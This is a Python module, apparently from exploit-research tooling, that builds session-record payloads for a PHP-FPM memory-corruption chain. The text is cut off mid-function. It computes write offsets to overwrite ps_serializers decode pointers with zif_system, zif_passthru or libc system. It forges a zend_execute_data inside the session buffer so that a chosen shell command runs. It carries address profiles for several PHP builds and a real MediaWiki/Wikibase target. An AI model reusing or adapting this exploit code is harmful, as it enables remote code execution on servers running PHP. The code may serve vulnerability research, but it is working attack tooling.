#!/usr/bin/env python3
"""g2_chain.py - G2/G6 FPM chain profiles and offline record plans.

G2 is the confirmed FPM route on the plain PHP 8.5.10 build, with derived
profiles for 8.4.25, 8.1.34 and 7.4.33: a controlled bailout leaves a stale
BG(unserialize) dtor chain, the pre RINIT upload progress session decode reuses
it, and the typed zval write reaches ps_serializers[2] decode in .data. The
forced END decode then calls the overwritten pointer with the session record
bytes as rdi. The default php handler decode slot is not 16 byte aligned, so its
profile target is the PS(serializer) slot plus a fake ps_serializer struct.

G6 keeps the same write but points ps_serializers[2].decode at zif_system or
zif_passthru and shapes the session buffer as a fake zend_execute_data:
num_args=1 at S+0x2c, the argument value F at S+0x50, IS_STRING at S+0x58,
F+0x10=strlen(F+0x18), and a non-empty NUL-free command at F+0x18. zif_system
executes the command and is one-shot (its return_value write SIGSEGVs at
php_exec+450); zif_passthru is the clean surviving control.

The realapps 8.5.10 profile records the confirmed F12b route on the installed
MediaWiki/Wikibase binary: the active `php` serializer decode slot
(`ps_serializers[1].decode`, 0x22c54c8) is overwritten with `zif_system`
(0xa3c061), and the session record is a `php`-format fake execute_data. That
record shape differs from the php_binary G6 builder, so the `php`-slot record is
still built by the receipt's `scripts/mkrec.py`; the profile itself carries
`record_builder: php_binary_zif`, and the offline builder plans its entry-2
`php_binary` slot (0x22c54e0), not the entry-1 `php` slot (0x22c54c8, 8 mod 16).
`zif_passthru` 0xa3c074 is symbol verified, and its clean run on that `php` slot
is in `receipts/realchain_20261022/` (the F12b record itself stays private
ASLR-off). The separate realapps `php_binary` slot (0x22c54e0) has its own clean
`zif_passthru` run in the realzif receipt (`receipts/realzif_entry2_1022/`).

The writer always resolves its target by serializer entry name, `php_binary`,
rather than by a fixed index or by `ps_serializers.default_target`: the lab
profiles put `php_binary` at the default target, but the realapps profile's
default target is the F12b `php` slot. The fake execute_data arg1 pointer is
derived from the record-2 payload start Q:
``F = X2 + 0x18 + Q + 0x100``. Q shifts with the decimal width of the written
zif address (0x77 for a seven-digit lab value, 0x78 for realapps 0xa3c074), so
F must never use a fixed Q. `zif_passthru` is profile data, never
`zif_system + 0x10`: the delta is +0x10 on the four lab builds and +0x13 on
realapps. A decode overwrite is worker-local `.data` poison: it persists across
non-crashing decodes and is cleared only by worker recycle; FPM's crash respawn
starts a pristine worker.

This module is profile data plus arithmetic: it loads
addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes

    used_slots = (target - (b0 + 0x10)) / 16

and frames the php_binary or zif record (rec1 key/long, rec2 payload with the
fake php_unserialize_data, fake var_dtor_entries and, for G6, the fake
zend_execute_data). No transport and no process control: the driver step is
--step g2 and only writes the record bytes plus the plan JSON.
"""


import argparse
import json
import struct
from pathlib import Path


HERE = Path(__file__).resolve()
DEFAULT_PROFILE = HERE.parents[2] / "addresses" / "g2_fpm_8510.json"
PROFILE_DIR = DEFAULT_PROFILE.parent
# Version labels are convenience keys. The offsets are locked to the binary
# md5, so a md5 key selects the same profile and a version key is only a label.
PROFILE_FILES = {
    "8.5.10": "g2_fpm_8510.json",
    "8.4.25": "g2_fpm_8425.json",
    "8.1.34": "g2_fpm_8134.json",
    "7.4.33": "g2_fpm_7433.json",
    "realapps-8.5.10": "g2_fpm_realapps_8510.json",
}
PROFILE_MD5 = {
    "825470df6b9fa7d0178a1a9bcf4ce6dc": "8.5.10",
    "95cca39b95cb5f2d5b897fc5cc6e8628": "8.4.25",
    "6ea2762ef76f44674805736e19570bb1": "8.1.34",
    "9c7b5c2287fdebe6b3324223034715da": "7.4.33",
    "4ee099823b75e16ea36f93c71d57bfd8": "realapps-8.5.10",
}
COMMAND_BYTES = 32
FAKE_P_BYTES = 72
FAKE_B0_BYTES = 16

# G6: the php_binary decode slot can be pointed at zif_system /
# zif_passthru.  The session payload doubles as the fake zend_execute_data.
DECODE_MODES = ("php_binary", "zif_system", "zif_passthru")
ZIF_DECODE_MODES = ("zif_system", "zif_passthru")
ZIF_KEY1_BYTES = 96
ZIF_F_PAYLOAD_OFF = 0x100
ZIF_CMD_LEN_OFF = ZIF_F_PAYLOAD_OFF + 0x10
ZIF_CMD_OFF = ZIF_F_PAYLOAD_OFF + 0x18
ZIF_NUM_ARGS_OFF = 0x2C
ZIF_ARG1_VALUE_OFF = 0x50
ZIF_ARG1_TYPE_OFF = 0x58
ZIF_ARG1_IS_STRING = 6
# Committed receipts are referenced repo-relative; only receipts that are not
# in the repo yet keep their absolute /tmp research path (F12B_RECEIPT).
ZIF_RECEIPT = "receipts/g6zif_1021"
PHP_BINARY_ZIF_BUILDER = "php_binary_zif"
PHP_BINARY_SERIALIZER = "php_binary"
F12B_RECEIPT = "/tmp/opencode/research/f12b_zif_20261021T222457Z"
REALZIF_RECEIPT = "receipts/realzif_entry2_1022"


def _require_record_builder(profile: dict) -> None:
    """Reject profiles whose record shape this offline builder does not emit."""
    builder = profile.get("record_builder", PHP_BINARY_ZIF_BUILDER)
    if builder != PHP_BINARY_ZIF_BUILDER:
        raise ValueError(
            f"profile {profile.get('name')!r} uses the {builder!r} session "
            "record shape; the offline --step g2 builder emits only the "
            f"{PHP_BINARY_ZIF_BUILDER!r} php_binary record. Use the F12b "
            f"receipt's scripts/mkrec.py ({F12B_RECEIPT}) for that route."
        )


def hex_int(value, name: str) -> int:
    """Parse an int or a 0x string, reject bool and everything else."""
    if isinstance(value, bool):
        raise ValueError(f"{name} must be an integer, not a bool")
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        try:
            return int(value, 16) if value.lower().startswith("0x") else int(value)
        except ValueError as error:
            raise ValueError(f"{name} is not an integer: {value!r}") from error
    raise ValueError(f"{name} is not an integer: {value!r}")


def resolve_profile(value: str | Path | None = None) -> Path:
    """Map a profile version, md5 or .json path to a profile file."""
    if value is None:
        return DEFAULT_PROFILE
    if isinstance(value, Path):
        return value
    key = str(value)
    if key in PROFILE_FILES:
        return PROFILE_DIR / PROFILE_FILES[key]
    if key.lower() in PROFILE_MD5:
        return PROFILE_DIR / PROFILE_FILES[PROFILE_MD5[key.lower()]]
    path = Path(key)
    if path.suffix.lower() == ".json":
        return path
    raise ValueError(
        f"unknown g2 profile {key!r}; use one of "
        + ", ".join(PROFILE_FILES) + ", a profile md5, or a .json path"
    )


def load_profile(value: str | Path | None = None) -> tuple[dict, Path]:
    profile_path = resolve_profile(value)
    return json.loads(profile_path.read_text()), profile_path


def system_target(profile: dict, libc_base: int) -> int:
    return libc_base + hex_int(profile["libc"]["system_offset"], "system offset")


def used_slots_for(target: int, b0: int) -> int:
    """Slot index for the 16 byte write; target and b0+0x10 must agree mod 16."""
    delta = target - (b0 + 0x10)
    if delta % 16:
        raise ValueError(
            f"target 0x{target:x} is not reachable from b0 0x{b0:x}: "
            f"target - (b0 + 0x10) = 0x{delta:x} is not 16 byte aligned"
        )
    used_slots = delta // 16
    if not -(1 << 63) <= used_slots < 0:
        raise ValueError(
            f"used_slots {used_slots} is outside the signed negative range; "
            "the write direction is downward from b0"
        )
    return used_slots


def _solve_lengths(total: int, rec1_len: int) -> tuple[int, int, int]:
    """Solve total = rec1 + 8 + digits(L) + L; returns L, prefix len, payload start."""
    if total <= rec1_len + 10:
        raise ValueError(
            f"total {total} is too small for a {rec1_len} byte rec1"
        )
    length = total - rec1_len - 8
    for _ in range(8):
        next_length = total - rec1_len - 8 - len(str(length))
        if next_length == length:
            break
        length = next_length
    else:
        raise ValueError("record length does not converge")
    if length <= 0:
        raise ValueError(f"negative payload length {length}")
    prefix_len = 6 + len(str(length))  # 0x01 'z' s : digits : "
    return length, prefix_len, rec1_len + prefix_len


def _command_bytes(command: str | bytes) -> bytes:
    if isinstance(command, str):
        command = command.encode("latin1")
    if not isinstance(command, bytes):
        raise ValueError("command must be a str or bytes")
    if not command:
        raise ValueError("command is empty")
    if len(command) > COMMAND_BYTES:
        raise ValueError(
            f"command is {len(command)} bytes; the php_binary key length byte "
            f"is fixed at 0x20, so the maximum is {COMMAND_BYTES}"
        )
    if not command.rstrip().endswith(b"#"):
        raise ValueError(
            "command must end in #: the serialized i:<n>; text follows the "
            "command in the same shell line and is commented out"
        )
    return command + b" " * (COMMAND_BYTES - len(command))


def _long_value(value: str | bytes) -> bytes:
    if isinstance(value, str):
        value = value.encode("latin1")
    if not isinstance(value, bytes):
        raise ValueError("value must be a str or bytes")
    if not value.startswith(b"i:") or not value.endswith(b";"):
        raise ValueError("value must be a serialized long: i:<n>;")
    digits = value[2:-1]
    if digits[:1] == b"-":
        digits = digits[1:]
    if not digits.isdigit():
        raise ValueError("value must be a serialized long: i:<n>;")
    return value


def _zif_delta(profile: dict) -> int | None:
    """Return zif_passthru - zif_system from the profile when both exist.

    The delta is build data, not a builder constant: +0x10 on the four lab
    binaries and +0x13 on realapps (both symbols are 19-byte functions there).
    A declared zif_route delta is cross-checked against the two addresses.
    """
    if profile.get("zif_system") is None or profile.get("zif_passthru") is None:
        return None
    system = hex_int(profile["zif_system"], "zif_system")
    passthru = hex_int(profile["zif_passthru"], "zif_passthru")
    delta = passthru - system
    if delta <= 0:
        raise ValueError(
            f"zif_passthru 0x{passthru:x} does not follow "
            f"zif_system 0x{system:x}"
        )
    declared = ((profile.get("zif_route") or {}).get("zif_passthru") or {}).get(
        "delta_from_zif_system")
    if declared is not None:
        declared_token = str(declared).strip().split()[0].lstrip("+")
        declared_value = hex_int(declared_token, "zif_passthru delta")
        if declared_value != delta:
            raise ValueError(
                f"profile zif_route delta {declared!r} disagrees with "
                f"zif_passthru - zif_system = +0x{delta:x}"
            )
    return delta


def _zif_symbol(profile: dict, decode: str) -> int:
    """Return the profile's zif_system/zif_passthru address."""
    if decode not in ZIF_DECODE_MODES:
        raise ValueError(
            "decode must be one of " + ", ".join(DECODE_MODES)
            + f", not {decode!r}"
        )
    # Read the profile symbol; never synthesize zif_passthru as
    # zif_system + 0x10 (realapps uses +0x13).
    if decode not in profile:
        raise ValueError(
            f"profile {profile.get('name')!r} has no {decode} address; "
            "the profile is not G6-ready"
        )
    address = hex_int(profile[decode], f"{decode} address")
    if not 0 < address < 1 << 64:
        raise ValueError(f"{decode} address must be a positive 64 bit address")
    _zif_delta(profile)
    return address


def _zif_command_bytes(command: str | bytes) -> bytes:
    """Normalize the zif command and enforce the parse requirements."""
    if isinstance(command, str):
        command = command.encode("latin1")
    if not isinstance(command, bytes):
        raise ValueError("command must be a str or bytes")
    if not command:
        raise ValueError("zif command is empty; php_exec_ex requires one string argument")
    if b"\x00" in command:
        raise ValueError(
            "zif command contains a NUL byte; the command is a normal "
            "NUL-terminated C string and the fake zend_string length must "
            "equal strlen"
        )
    return command


def _serializer_entry(profile: dict, name: str) -> dict:
    """Resolve a ps_serializers entry by name and validate its real slot.

    Table order is profile data, not an ABI constant: the realapps table has
    `php` at index 1 and `php_binary` at index 2.  Resolve the entry by name,
    then verify table + index * stride + 0x10 == decode before using it.
    """
    table = profile["ps_serializers"]
    matches = [
        candidate for candidate in table["entries"]
        if candidate.get("name") == name
    ]
    if len(matches) != 1:
        raise ValueError(
            f"profile {profile.get('name')!r} has {len(matches)} "
            f"ps_serializers entries named {name!r}; expected exactly one"
        )
    entry = matches[0]
    index = entry.get("index")
    if not isinstance(index, int) or isinstance(index, bool) or index < 0:
        raise ValueError(
            f"ps_serializers entry {name!r} has no non-negative integer index"
        )
    expected = (
        hex_int(table["table"], "table")
        + index * profile["structs"]["ps_serializer_size"]
        + 0x10
    )
    actual = hex_int(entry["decode"], "decode slot")
    if actual != expected:
        raise ValueError(
            f"ps_serializers[{index}] ({name}) decode 0x{actual:x} does not "
            f"match table + index * stride + 0x10 = 0x{expected:x}"
        )
    return entry


def _decode_entry(profile: dict, target: int) -> dict | None:
    """Validate a serializer decode slot and return its profile entry.

    A target outside the table (for example the PS(serializer) pointer route)
    returns None.  A target that matches an entry is validated by name and by
    the table arithmetic, and must be 16 byte aligned for the typed write.
    """
    table = profile["ps_serializers"]
    entry = None
    for candidate in table["entries"]:
        decode = hex_int(candidate["decode"], "decode slot")
        if decode == target:
            if entry is not None:
                raise ValueError(
                    f"more than one ps_serializers entry uses decode "
                    f"0x{target:x}"
                )
            entry = candidate
    if entry is None:
        return None
    name = entry.get("name")
    if name is not None:
        _serializer_entry(profile, name)
    if not entry.get("decode_16b_aligned"):
        raise ValueError(
            f"ps_serializers[{entry['index']}] ({name}) decode is not 16 byte "
            "aligned"
        )
    return entry


def _fake_zend_string_addr(x2: int, payload_start: int) -> int:
    """F = ZSTR_VAL(X2) + Q + ZIF_F_PAYLOAD_OFF with Q from record geometry.

    Q is the record-2 payload start.  It moves with the decimal width of the
    serialized zif address (0x77 for a seven-digit lab value, 0x78 for the
    eight-digit realapps 0xa3c074), so F must not use a fixed payload offset.
    """
    return x2 + 0x18 + payload_start + ZIF_F_PAYLOAD_OFF


def _overlaps(start_a: int, end_a: int, start_b: int, end_b: int) -> bool:
    return start_a < end_b and start_b < end_a


def plan(x: int, p: int, b0: int, total: int | None = None,
         command: str | bytes | None = None, value: str | bytes | None = None,
         libc_base: int | None = None, target: int | None = None,
         profile: dict | None = None,
         profile_path: Path | None = None,
         decode: str = "php_binary",
         x2: int | None = None) -> dict:
    """Offline G2/G6 record plan from operator supplied addresses.

    All addresses are explicit. The module never guesses X, P, B0 or a libc
    base; a missing or inconsistent address raises ValueError. ``decode`` is
    ``php_binary`` (the original G2 record), ``zif_system`` (G6 one-shot) or
    ``zif_passthru`` (G6 clean control); the zif modes require ``x2``.
    """
    if decode not in DECODE_MODES:
        raise ValueError(
            "decode must be one of " + ", ".join(DECODE_MODES)
            + f", not {decode!r}"
        )
    if command is None:
        command = "id" if decode in ZIF_DECODE_MODES else "id;exit;#"
    if decode != "php_binary":
        if value is not None:
            raise ValueError("--g2-value does not apply to a zif decode target")
        if libc_base is not None:
            raise ValueError("--libc-base does not apply to a zif decode target")
        return plan_zif(
            x=x, x2=x2, p=p, b0=b0, total=total, command=command,
            decode=decode, target=target, profile=profile,
            profile_path=profile_path,
        )
    if x2 is not None:
        raise ValueError("--g2-x2 applies only to a zif decode target")
    if profile is None:
        profile, resolved_path = load_profile()
        if profile_path is None:
            profile_path = resolved_path
    _require_record_builder(profile)
    table = profile["ps_serializers"]
    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
    if not serializer.get("decode_16b_aligned"):
        raise ValueError(
            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
            "decode is not 16 byte aligned"
        )
    if target is None:
        target = hex_int(serializer["decode"], "php_binary decode slot")
    for name, address in (("x", x), ("p", p), ("b0", b0), ("target", target)):
        if not 0 < address < 1 << 64:
            raise ValueError(f"{name} must be a positive 64 bit address")
    if not x + 24 <= p:
        raise ValueError(
            f"P 0x{p:x} is not inside the record buffer at X 0x{x:x} "
            f"(ZSTR_VAL = X + 24)"
        )
    if not p + 0x48 <= b0:
        raise ValueError(
            f"B0 0x{b0:x} overlaps the fake php_unserialize_data at P 0x{p:x}"
        )
    if target % 16:
        raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
    entry = _decode_entry(profile, target)

    used_slots = used_slots_for(target, b0)
    second_slot = target + 16
    if second_slot >= b0:
        raise ValueError("second slot is not below b0; the write is not downward")

    if libc_base is not None and value is not None:
        raise ValueError("pass --libc-base or --g2-value, not both")
    if libc_base is not None:
        system = system_target(profile, libc_base)
        value_bytes = f"i:{system};".encode("ascii")
    else:
        system = None
        value_bytes = _long_value(value if value is not None else "i:1;")

    command_bytes = _command_bytes(command)
    rec1 = b"\x20" + command_bytes + value_bytes
    if total is None:
        total = profile["record"]["lab_geometry"]["total"]

    length, prefix_len, payload_start = _solve_lengths(total, len(rec1))
    p_off = p - (x + 24)
    b_off = b0 - (x + 24)
    p_idx = p_off - payload_start
    b_idx = b_off - payload_start
    checks = [
        {"check": "rec1_key_length", "ok": len(command_bytes) == COMMAND_BYTES,
         "detail": f"{len(command_bytes)} byte key, leading byte 0x20"},
        {"check": "long_value", "ok": True, "detail": value_bytes.decode("latin1")},
        {"check": "target_16b_aligned", "ok": target % 16 == 0,
         "detail": f"0x{target:x}"},
        {"check": "used_slots_negative", "ok": used_slots < 0,
         "detail": f"{used_slots}"},
        {"check": "second_slot", "ok": second_slot < b0,
         "detail": f"0x{second_slot:x}"},
        {"check": "fake_p_in_payload",
         "ok": p_idx >= 0 and p_idx + FAKE_P_BYTES <= length,
         "detail": f"p_off 0x{p_off:x} p_idx {p_idx} L {length}"},
        {"check": "fake_b0_in_payload",
         "ok": b_idx >= 0 and b_idx + FAKE_B0_BYTES <= length,
         "detail": f"b_off 0x{b_off:x} b_idx {b_idx} L {length}"},
        {"check": "record_length", "ok": length > 0,
         "detail": f"total {total} rec1 {len(rec1)} L {length}"},
    ]
    failed = [item["check"] for item in checks if not item["ok"]]
    if failed:
        raise ValueError("record checks failed: " + ", ".join(failed))

    payload = bytearray(length)
    struct.pack_into(
        "<QQQQQQQQ", payload, p_idx,
        p + 56, b0, b0, 0, 0, 0, 0x7FFFFFFF,
        profile["structs"]["var_entries_max"],
    )
    struct.pack_into("<qQ", payload, b_idx, used_slots, 0)
    record = (
        rec1
        + b"\x01zs:" + str(length).encode("ascii") + b':"'
        + bytes(payload)
        + b'";'
    )
    if len(record) != total:
        raise ValueError(f"record is {len(record)} bytes, expected {total}")
    if record[payload_start + p_idx:payload_start + p_idx + 8] != \
            struct.pack("<Q", p + 56):
        raise ValueError("fake P placement mismatch")
    if record[payload_start + b_idx:payload_start + b_idx + 8] != \
            struct.pack("<q", used_slots):
        raise ValueError("fake B0 placement mismatch")

    return {
        "profile": profile["name"],
        "profile_source": str(profile_path) if profile_path is not None else None,
        "lane": profile["lane"],
        "stage": profile["stage"],
        "route": "G2",
        "decode": "php_binary",
        "decode_kind": "php_binary",
        "serializer": PHP_BINARY_SERIALIZER,
        "status": profile["status"],
        "binary": profile["binary"],
        "build_id": profile["build_id"],
        "md5": profile.get("md5"),
        "php_version": profile["php_version"],
        "elf_type": profile["elf_type"],
        "pie": profile["pie"],
        "zend_eval_string": profile.get("zend_eval_string"),
        "zend_eval_stringl": profile.get("zend_eval_stringl"),
        "dry_run": True,
        "sent": False,
        "no_transport": True,
        "addresses": {
            "x": f"0x{x:x}",
            "zstr_val": f"0x{x + 24:x}",
            "p": f"0x{p:x}",
            "b0": f"0x{b0:x}",
            "target": f"0x{target:x}",
            "system": f"0x{system:x}" if system is not None else None,
            "libc_base": f"0x{libc_base:x}" if libc_base is not None else None,
        },
        "target_entry": (
            {"index": entry["index"], "name": entry["name"]}
            if entry is not None else None
        ),
        "serializer_entry": {
            "index": serializer["index"],
            "name": serializer["name"],
            "decode": serializer["decode"],
        },
        "ps_serializers": {
            "table": table["table"],
            "active_serializer_slot": table["active_serializer_slot"],
            "terminator": table["terminator"],
            "default_handler": table.get("default_handler"),
            "default_php_decode": table.get("default_php_decode"),
            "default_php_decode_16b_aligned": table.get(
                "default_php_decode_16b_aligned"),
            "note": table.get("note"),
        },
        "ps_serializer_slot": profile.get("ps_serializer_slot"),
        "decode_call": profile["decode_call"],
        "used_slots": used_slots,
        "slot": f"0x{target:x}",
        "second_slot": f"0x{second_slot:x}",
        "type_zero_offsets": [
            f"0x{target + 8:x}", f"0x{target + 24:x}"],
        "geometry": {
            "total": total,
            "rec1_len": len(rec1),
            "command_bytes": len(command_bytes),
            "value": value_bytes.decode("latin1"),
            "length": length,
            "payload_start": payload_start,
            "p_off": p_off,
            "p_idx": p_idx,
            "b_off": b_off,
            "b_idx": b_idx,
        },
        "checks": checks,
        "prerequisites": profile["prerequisites"],
        "caveats": profile["caveats"],
        "receipts": profile["receipts"],
        "record": record,
    }


def plan_zif(x: int, x2: int | None, p: int, b0: int,
             total: int | None = None, command: str | bytes | None = None,
             decode: str = "zif_passthru", target: int | None = None,
             profile: dict | None = None,
             profile_path: Path | None = None) -> dict:
    """Offline G6 plan: point the php_binary decode slot at zif_system/passthru.

    The write target is the profile entry named ``php_binary`` (resolved by
    name, not by a fixed index or ``default_target``); the value written is the
    selected zif handler address.  ``x`` is the first decode zend_string (the
    planted T1 buffer), ``x2`` is the second decode zend_string (the re-encoded
    T2 buffer).  P and B0 are relative to the first buffer, while the fake
    zend_string pointer F is derived from the second buffer and Q.
    """
    if decode not in ZIF_DECODE_MODES:
        raise ValueError(
            "zif decode must be one of " + ", ".join(ZIF_DECODE_MODES)
            + f", not {decode!r}"
        )
    if profile is None:
        profile, resolved_path = load_profile()
        if profile_path is None:
            profile_path = resolved_path
    _require_record_builder(profile)
    table = profile["ps_serializers"]
    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
    if not serializer.get("decode_16b_aligned"):
        raise ValueError(
            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
            "decode is not 16 byte aligned"
        )
    zif = _zif_symbol(profile, decode)
    zif_delta = _zif_delta(profile)
    if target is None:
        target = hex_int(serializer["decode"], "php_binary decode slot")
    if x2 is None:
        raise ValueError(
            f"--g2-decode {decode} requires --g2-x2: the second decode "
            "buffer is where the fake execute_data is read"
        )
    for name, address in (
        ("x", x), ("x2", x2), ("p", p), ("b0", b0), ("target", target),
    ):
        if not 0 < address < 1 << 64:
            raise ValueError(f"{name} must be a positive 64 bit address")
    if x + 24 >= 1 << 64 or x2 + 24 >= 1 << 64:
        raise ValueError("record zend_string address overflows 64 bits")
    if not x + 24 <= p:
        raise ValueError(
            f"P 0x{p:x} is not inside the first record buffer at X 0x{x:x} "
            f"(ZSTR_VAL = X + 24)"
        )
    if not p + 0x48 <= b0:
        raise ValueError(
            f"B0 0x{b0:x} overlaps the fake php_unserialize_data at P 0x{p:x}"
        )
    if target % 16:
        raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
    entry = _decode_entry(profile, target)
    used_slots = used_slots_for(target, b0)
    if target != b0 + 0x10 + 16 * used_slots:
        raise ValueError("negative used_slots arithmetic is not exact")
    second_slot = target + 16
    if second_slot >= b0:
        raise ValueError("second slot is not below b0; the write is not downward")

    value_bytes = f"i:{zif};".encode("ascii")
    if command is None:
        command = "id"
    command_bytes = _zif_command_bytes(command)
    if total is None:
        total = profile["record"]["lab_geometry"]["total"]
    rec1_len = 1 + ZIF_KEY1_BYTES + len(value_bytes)
    length, prefix_len, payload_start = _solve_lengths(total, rec1_len)
    Q = payload_start
    f_off = Q + ZIF_F_PAYLOAD_OFF
    f_addr = _fake_zend_string_addr(x2, Q)
    if f_addr >= 1 << 64:
        raise ValueError("fake zend_string pointer overflows 64 bits")
    p_off = p - (x + 24)
    b_off = b0 - (x + 24)
    p_idx = p_off - Q
    b_idx = b_off - Q
    f_end = ZIF_CMD_OFF + len(command_bytes) + 1
    command_ok = bool(command_bytes) and b"\x00" not in command_bytes

    checks = [
        {"check": "decode_mode", "ok": decode in ZIF_DECODE_MODES,
         "detail": decode},
        {"check": "zif_symbol", "ok": 0 < zif < 1 << 64,
         "detail": f"0x{zif:x}"},
        {"check": "arg1_pointer_from_Q",
         "ok": f_addr == x2 + 0x18 + Q + ZIF_F_PAYLOAD_OFF,
         "detail": f"F=0x{f_addr:x} = X2+0x18 + Q 0x{Q:x} "
                   f"+ 0x{ZIF_F_PAYLOAD_OFF:x}"},
        {"check": "zif_passthru_profile_delta",
         "ok": zif_delta is None or zif_delta > 0,
         "detail": (f"zif_passthru - zif_system = +0x{zif_delta:x}"
                    if zif_delta is not None
                    else "profile carries a single zif symbol")},
        {"check": "key1_length", "ok": ZIF_KEY1_BYTES == 96,
         "detail": f"{ZIF_KEY1_BYTES} byte binary session key"},
        {"check": "value_is_zif_address", "ok": True,
         "detail": value_bytes.decode("ascii")},
        {"check": "target_16b_aligned", "ok": target % 16 == 0,
         "detail": f"0x{target:x}"},
        {"check": "used_slots_negative", "ok": used_slots < 0,
         "detail": f"{used_slots}"},
        {"check": "used_slots_exact",
         "ok": target == b0 + 0x10 + 16 * used_slots,
         "detail": f"K={used_slots} target=0x{target:x}"},
        {"check": "second_slot", "ok": second_slot < b0,
         "detail": f"0x{second_slot:x}"},
        {"check": "fake_p_in_payload",
         "ok": p_idx >= 0 and p_idx + FAKE_P_BYTES <= length,
         "detail": f"p_off 0x{p_off:x} p_idx {p_idx} L {length}"},
        {"check": "fake_b0_in_payload",
         "ok": b_idx >= 0 and b_idx + FAKE_B0_BYTES <= length,
         "detail": f"b_off 0x{b_off:x} b_idx {b_idx} L {length}"},
        {"check": "fake_execute_data_in_payload",
         "ok": ZIF_CMD_LEN_OFF + 8 <= length and f_end <= length,
         "detail": f"F payload off 0x{ZIF_F_PAYLOAD_OFF:x} "
                   f"cmd end {f_end} L {length}"},
        {"check": "fake_execute_data_geometry",
         "ok": ZIF_F_PAYLOAD_OFF + 0x18 == ZIF_CMD_OFF,
         "detail": "F+0x10 length, F+0x18 command"},
        {"check": "command_nonempty", "ok": command_ok,
         "detail": f"{len(command_bytes)} bytes"},
        {"check": "fake_p_no_execute_data_overlap",
         "ok": not _overlaps(p_idx, p_idx + FAKE_P_BYTES,
                             ZIF_F_PAYLOAD_OFF, f_end),
         "detail": "fake P and fake execute_data are disjoint"},
        {"check": "fake_b0_no_execute_data_overlap",
         "ok": not _overlaps(b_idx, b_idx + FAKE_B0_BYTES,
                             ZIF_F_PAYLOAD_OFF, f_end),
         "detail": "fake B0 and fake execute_data are disjoint"},
        {"check": "record_length", "ok": length > 0,
         "detail": f"total {total} rec1 {rec1_len} L {length}"},
    ]
    failed = [item["check"] for item in checks if not item["ok"]]
    if failed:
        raise ValueError("zif record checks failed: " + ", ".join(failed))

    # Record 1 is a 96 byte binary key followed by the serialized zif address.
    # In the re-encoded buffer the key is written back verbatim, so file
    # offsets 0x2c/0x50/0x58 become execute_data fields on decode #2.
    key1 = bytearray(b"A" * ZIF_KEY1_BYTES)
    struct.pack_into("<I", key1, ZIF_NUM_ARGS_OFF - 1, 1)
    struct.pack_into("<Q", key1, ZIF_ARG1_VALUE_OFF - 1, f_addr)
    key1[ZIF_ARG1_TYPE_OFF - 1] = ZIF_ARG1_IS_STRING
    rec1 = bytes([ZIF_KEY1_BYTES]) + bytes(key1) + value_bytes
    if len(rec1) != rec1_len:
        raise ValueError("record 1 length changed during construction")
    prefix = b"\x01zs:" + str(length).encode("ascii") + b':"'
    if len(prefix) != prefix_len:
        raise ValueError("record 2 prefix length changed during construction")
    if len(rec1) + len(prefix) != Q:
        raise ValueError("record-2 payload start Q changed during construction")

    payload = bytearray(length)
    struct.pack_into(
        "<QQQQQQQQ", payload, p_idx,
        p + 56, b0, b0, 0, 0, 0, 0x7FFFFFFF,
        profile["structs"]["var_entries_max"],
    )
    payload[p_idx + 64:p_idx + 72] = b"\x00" * 8
    struct.pack_into("<qQ", payload, b_idx, used_slots, 0)
    struct.pack_into("<Q", payload, ZIF_CMD_LEN_OFF, len(command_bytes))
    payload[ZIF_CMD_OFF:ZIF_CMD_OFF + len(command_bytes)] = command_bytes
    payload[ZIF_CMD_OFF + len(command_bytes)] = 0
    record = rec1 + prefix + bytes(payload) + b'";'
    if len(record) != total:
        raise ValueError(f"record is {len(record)} bytes, expected {total}")
    if record[0] != ZIF_KEY1_BYTES:
        raise ValueError("key1 length byte mismatch")
    if record[ZIF_ARG1_VALUE_OFF:ZIF_ARG1_VALUE_OFF + 8] != \
            struct.pack("<Q", _fake_zend_string_addr(x2, Q)):
        raise ValueError("arg1 pointer is not the Q-derived F address")
    if record[payload_start + p_idx:payload_start + p_idx + 8] != \
            struct.pack("<Q", p + 56):
        raise ValueError("fake P placement mismatch")
    if record[payload_start + b_idx:payload_start + b_idx + 8] != \
            struct.pack("<q", used_slots):
        raise ValueError("fake B0 placement mismatch")
    if record[payload_start + ZIF_CMD_LEN_OFF:
              payload_start + ZIF_CMD_LEN_OFF + 8] != \
            struct.pack("<Q", len(command_bytes)):
        raise ValueError("fake zend_string length mismatch")
    if record[payload_start + ZIF_CMD_OFF:
              payload_start + ZIF_CMD_OFF + len(command_bytes)] != command_bytes:
        raise ValueError("fake command placement mismatch")

    if decode == "zif_passthru":
        target_behavior = (
            "clean: php_exec type=3 (passthru) never writes return_value; "
            "the lab request returned HTTP 200 and the worker survived"
        )
    else:
        target_behavior = (
            "one-shot: php_exec type=1 (system) executes the command, then "
            "writes a zval through return_value=ZSTR_LEN(data) and SIGSEGVs "
            "at php_exec+450; no parameterless clean path"
        )

    caveats = list(profile.get("caveats") or [])
    caveats.extend([
        f"{decode}: {target_behavior}",
        "G6 needs both decode buffers: X (first, planted T1) for P/B0 and "
        "X2 (second, re-encoded T2) for the fake execute_data pointer F; "
        "the planted and re-encoded lengths differ (lab: 131014 -> 131313)",
        "the fake execute_data is the session buffer itself: num_args=1 at "
        "S+0x2c, arg1 value at S+0x50, IS_STRING (6) at S+0x58, "
        "F+0x10=length(F+0x18), command non-empty and NUL-free; func and "
        "arg_info are not read",
        "zif_passthru is preferred when the worker must survive; zif_system "
        "is a one-shot proof because the php_exec return-value write is "
        "unavoidable for type=1",
        "the decode overwrite is worker-local .data poison: it persists "
        "across non-crashing decodes and is cleared only by worker recycle; "
        "a crafted crash respawns a pristine worker but is not safe "
        "remediation",
        "real-target status: F12b php-slot zif_system confirmed one-shot, and "
        "its clean zif_passthru run is in the realchain receipt; the realapps "
        "php_binary slot zif_passthru clean run is in the realzif receipt; F14 "
        "reproduced under ASLR on with P/B0 from a pre-final calibration; the "
        "G6 proof is a private ASLR-off lab run",
    ])
    receipts = dict(profile.get("receipts") or {})
    receipts.setdefault("G6", ZIF_RECEIPT)
    receipts.setdefault("realzif", REALZIF_RECEIPT)

    return {
        "profile": profile["name"],
        "profile_source": str(profile_path) if profile_path is not None else None,
        "lane": profile["lane"],
        "stage": profile["stage"],
        "route": "G6",
        "decode": decode,
        "decode_kind": "zif",
